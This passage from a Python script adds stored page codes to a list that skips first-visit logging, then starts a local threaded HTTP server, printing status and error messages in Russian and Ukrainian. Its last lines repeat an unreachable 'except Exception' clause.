        conn.close()
        
        for page_code in existing_page_codes:
            IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
        
        print(f"📝 Добавлено {len(existing_page_codes)} существующих page_code в список игнорирования первого лога")
    except Exception as e:
        print(f"⚠️ Ошибка при добавлении существующих page_code: {e}")
    
    try:
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.ThreadingTCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
            print(f"🌐 Сервер запущений на порту {PORT}")
            print(f"📁 Обслуговуємо папку: {DIRECTORY}")
            print(f"🔗 Сайт доступний за адресою: http://localhost:{PORT}/")
            httpd.serve_forever()
    except PermissionError:
        print(f"❌ Помилка: Немає прав для запуску на порту {PORT}")
        print("💡 Спробуйте запустити з правами адміністратора або використайте порт 8080")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"❌ Помилка: Порт {PORT} вже використовується")
            print("💡 Зупиніть інший сервер або використайте інший порт")
        else:
            print(f"❌ Помилка запуску сервера: {e}")
    except KeyboardInterrupt:
        print("\n⏹️ Сервер зупинений користувачем")
    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}")

    except Exception as e:
        print(f"❌ Неочікувана помилка: {e}") 
